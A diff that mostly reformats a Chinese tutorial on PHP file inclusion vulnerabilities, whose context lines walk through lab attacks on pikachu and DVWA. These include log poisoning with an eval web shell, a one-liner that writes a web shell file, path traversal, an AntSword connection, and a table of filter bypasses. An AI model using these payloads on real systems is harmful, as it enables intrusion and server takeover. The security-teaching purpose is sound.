@@ -11,18 +11,20 @@ outline: [2, 3]
 
 # 文件包含漏洞
 
+> 🎯 本文按「一、是什么 → 二、为什么重要 → 三、测试思路 / 前置知识 → 漏洞检测思路 → 环境要求 → 四、核心内容 → 4.1 本地文件包含（LFI） → 4.2 远程文件包含（RFI）」的顺序整理，便于对照速查。
+
 ## 一、是什么
 
 包含操作在大多数 Web 语言中都会提供，但 PHP 对于包含文件所提供的功能太强大、太灵活，所以包含漏洞经常出现在 PHP 语言中，在其他语言中也可能出现包含漏洞。这也应了一句老话：功能越强大，漏洞就越多。
 
 PHP 中提供了四个包含文件的函数：`include()`、`include_once()`、`require()` 和 `require_once()`。
 
-| 函数 | 行为 |
-|------|------|
-| `require()` | 目标文件存在错误时，程序中断执行，显示致命错误 |
-| `include()` | 目标文件存在错误时，程序不中断，继续执行，显示警告错误 |
-| `include_once()` | 先检查目标文件是否已导入过，若是则不再重复导入 |
-| `require_once()` | 先检查目标文件是否已导入过，若是则不再重复导入 |
+| 函数             | 行为                                                   |
+|------------------|--------------------------------------------------------|
+| `require()`      | 目标文件存在错误时，程序中断执行，显示致命错误         |
+| `include()`      | 目标文件存在错误时，程序不中断，继续执行，显示警告错误 |
+| `include_once()` | 先检查目标文件是否已导入过，若是则不再重复导入         |
+| `require_once()` | 先检查目标文件是否已导入过，若是则不再重复导入         |
 
 ## 二、为什么重要
 
@@ -106,14 +108,14 @@ include($filename);
 
 **常见日志路径**：
 
-| 环境 | 日志路径 |
-|------|----------|
-| Linux Apache | `/var/log/httpd/access.log` |
-| Linux Nginx | `/var/log/nginx/access.log` |
-| Linux MySQL | `/var/log/mysql/access.log` |
+| 环境            | 日志路径                                         |
+|-----------------|--------------------------------------------------|
+| Linux Apache    | `/var/log/httpd/access.log`                      |
+| Linux Nginx     | `/var/log/nginx/access.log`                      |
+| Linux MySQL     | `/var/log/mysql/access.log`                      |
 | phpStudy Apache | `C:\phpStudy\PHPTutorial\Apache\logs\access.log` |
-| phpStudy Nginx | `C:\phpStudy\PHPTutorial\nginx\logs` |
-| phpStudy MySQL | `C:\phpStudy\PHPTutorial\MySQL\data\xxx.err` |
+| phpStudy Nginx  | `C:\phpStudy\PHPTutorial\nginx\logs`             |
+| phpStudy MySQL  | `C:\phpStudy\PHPTutorial\MySQL\data\xxx.err`     |
 
 **phpStudy 开启 Apache 日志**：
 
@@ -123,13 +125,13 @@ Apache 服务器运行后会生成两个日志文件：`access.log`（访问日�
 
 正常访问的日志记录：
 
-<img src="/assets/images/file-inclusion/image-20260713152215958.png" alt="phpStudy配置文件" style="zoom:50%;" />
+![phpStudy配置文件](/assets/images/file-inclusion/image-20260713152215958.png)
 
-<img src="/assets/images/file-inclusion/image-20260713152704370.png" alt="正常访问日志" style="zoom:67%;" />
+![正常访问日志](/assets/images/file-inclusion/image-20260713152704370.png)
 
 **步骤一：携带 payload 访问**
 
-```
+```php
 http://xxx.xxx.xxx/<?php eval($_POST[666]);?>
 ```
 
@@ -139,7 +141,7 @@ http://xxx.xxx.xxx/<?php eval($_POST[666]);?>
 
 **步骤二：BP 抓包，修改 URL 编码**
 
-<img src="/assets/images/file-inclusion/image-20260713213151685.png" alt="BP抓包修改" style="zoom:50%;" />
+![BP抓包修改](/assets/images/file-inclusion/image-20260713213151685.png)
 
 查看日志，payload 已成功写入：
 
@@ -161,13 +163,13 @@ http://192.168.239.131/pikachu/vul/fileinclude/fi_local.php?filename=../../../..
 
 成功解析日志中的恶意代码：
 
-<img src="/assets/images/file-inclusion/image-20260713214137304.png" alt="包含日志成功" style="zoom:67%;" />
+![包含日志成功](/assets/images/file-inclusion/image-20260713214137304.png)
 
 **步骤四：蚁剑连接**
 
 用蚁剑连接上述 URL，成功 getshell：
 
-<img src="/assets/images/file-inclusion/image-20260713215721508.png" alt="蚁剑连接成功" style="zoom:33%;" />
+![蚁剑连接成功](/assets/images/file-inclusion/image-20260713215721508.png)
 
 **进阶技巧：通过日志生成一句话木马文件**
 
@@ -177,7 +179,7 @@ http://192.168.239.131/pikachu/vul/fileinclude/fi_local.php?filename=../../../..
 <?php $file=fopen('jaden.php','w');fputs($file,'<?php @eval($_POST[666]);?>');?>
 ```
 
-代码含义：生成 `jaden.php` 文件，然后写入 `<?php @eval($_POST[666]);?>`。
+**代码含义**：生成 `jaden.php` 文件，然后写入 `<?php @eval($_POST[666]);?>`。
 
 ![写入payload到日志](/assets/images/file-inclusion/image-20260713220505722.png)
 
@@ -292,12 +294,12 @@ if(isset($_GET['page'])){
 关键代码：
 
 ```php
-<?php 
-$file = $_GET['page']; 
+<?php
+$file = $_GET['page'];
 
 // Input validation
 $file = str_replace( array( "http://", "https://" ), "", $file );
-$file = str_replace( array( "../", "..\"" ), "", $file ); 
+$file = str_replace( array( "../", "..\"" ), "", $file );
 ?>
 ```
 
@@ -314,17 +316,17 @@ $file = str_replace( array( "../", "..\"" ), "", $file );
 关键代码：
 
 ```php
-<?php 
-$file = $_GET['page']; 
+<?php
+$file = $_GET['page'];
 
 if( !fnmatch( "file*", $file ) && $file != "include.php" ) {
     echo "ERROR: File not found!";
-    exit; 
+    exit;
 }
 ?>
 ```
 
-代码逻辑：当文件既不是 `include.php`，也不符合 `file*`（文件名以 `file` 开头）时才抛出错误。反过来，只要文件名为 `include.php` 或者以 `file` 开头即可通过检测。
+**代码逻辑**：当文件既不是 `include.php`，也不符合 `file*`（文件名以 `file` 开头）时才抛出错误。反过来，只要文件名为 `include.php` 或者以 `file` 开头即可通过检测。
 
 **绕过方式一**：日志注入 + 文件包含，在当前目录下生成一个以 `file` 开头的 PHP 恶意文件。
 
@@ -338,17 +340,17 @@ http://192.168.0.103/dvwa/vulnerabilities/fi/page=file:///C:/xampp/htdocs/dvwa/p
 
 PHP 内置了多种 URL 风格的封装协议：
 
-| 协议 | 用途 |
-|------|------|
-| `file:///` | 访问本地文件系统 |
-| `http://` | 访问 HTTP(S) 网址 |
-| `ftp://` | 访问 FTP(S) URLs |
-| `php://` | 访问各个输入/输出流（I/O streams） |
-| `zlib://` | 压缩流 |
-| `data://` | 数据（RFC 2397） |
-| `ssh2://` | Secure Shell 2 |
-| `expect://` | 处理交互式的流 |
-| `glob://` | 查找匹配的文件路径模式（老协议） |
+| 协议        | 用途                               |
+|-------------|------------------------------------|
+| `file:///`  | 访问本地文件系统                   |
+| `http://`   | 访问 HTTP(S) 网址                  |
+| `ftp://`    | 访问 FTP(S) URLs                   |
+| `php://`    | 访问各个输入/输出流（I/O streams） |
+| `zlib://`   | 压缩流                             |
+| `data://`   | 数据（RFC 2397）                   |
+| `ssh2://`   | Secure Shell 2                     |
+| `expect://` | 处理交互式的流                     |
+| `glob://`   | 查找匹配的文件路径模式（老协议）   |
 
 ## 五、实战案例
 
@@ -375,13 +377,13 @@ PHP 内置了多种 URL 风格的封装协议：
 DVWA 的 Impossible 等级防御代码：
 
 ```php
-<?php 
-$file = $_GET['page']; 
+<?php
+$file = $_GET['page'];
 
 // Only allow include.php or file{1..3}.php
 if( $file != "include.php" && $file != "file1.php" && $file != "file2.php" && $file != "file3.php" ) {
     echo "ERROR: File not found!";
-    exit; 
+    exit;
 }
 ?>
 ```
@@ -392,17 +394,17 @@ if( $file != "include.php" && $file != "file1.php" && $file != "file2.php" && $f
 
 ### 攻击手法汇总
 
-| 利用方式 | 适用场景 | 前提条件 | 绕过要点 |
-|----------|---------|----------|---------|
-| 本地文件包含（LFI） | 读取/执行本地文件 | 无 | 路径穿越 `../` |
-| 远程文件包含（RFI） | 包含远程恶意文件 | `allow_url_include=on` | 远程托管恶意 PHP 文件 |
-| 日志文件包含 | 上传文件被改名时 | 日志可访问 + 知道路径 | 携带 payload 访问 → 包含日志 |
-| `file:///` 协议 | 读取非 PHP 文件 | 无 | 绝对路径 |
-| `php://filter` | 读取 PHP 源码 | 无 | Base64 编码输出后解码 |
-| `php://input` | 命令执行 | `allow_url_include=on` | POST 请求体传 PHP 代码 |
-| `%00` 截断 | 绕过自动拼接后缀 | `magic_quotes_gpc=off` + PHP < 5.3.4 | `%00` 截断后续字符串 |
-| `str_replace` 双写 | 绕过字符串替换过滤 | 无 | `..././` → 替换后 → `../` |
-| `fnmatch` 绕过 | 绕过文件名模式匹配 | 无 | `file:///` 协议 / 生成 file 开头文件 |
+| 利用方式            | 适用场景           | 前提条件                             | 绕过要点                             |
+|---------------------|--------------------|--------------------------------------|--------------------------------------|
+| 本地文件包含（LFI） | 读取/执行本地文件  | 无                                   | 路径穿越 `../`                       |
+| 远程文件包含（RFI） | 包含远程恶意文件   | `allow_url_include=on`               | 远程托管恶意 PHP 文件                |
+| 日志文件包含        | 上传文件被改名时   | 日志可访问 + 知道路径                | 携带 payload 访问 → 包含日志        |
+| `file:///` 协议     | 读取非 PHP 文件    | 无                                   | 绝对路径                             |
+| `php://filter`      | 读取 PHP 源码      | 无                                   | Base64 编码输出后解码                |
+| `php://input`       | 命令执行           | `allow_url_include=on`               | POST 请求体传 PHP 代码               |
+| `%00` 截断          | 绕过自动拼接后缀   | `magic_quotes_gpc=off` + PHP < 5.3.4 | `%00` 截断后续字符串                 |
+| `str_replace` 双写  | 绕过字符串替换过滤 | 无                                   | `..././` → 替换后 → `../`          |
+| `fnmatch` 绕过      | 绕过文件名模式匹配 | 无                                   | `file:///` 协议 / 生成 file 开头文件 |
 
 ### 防护建议
 
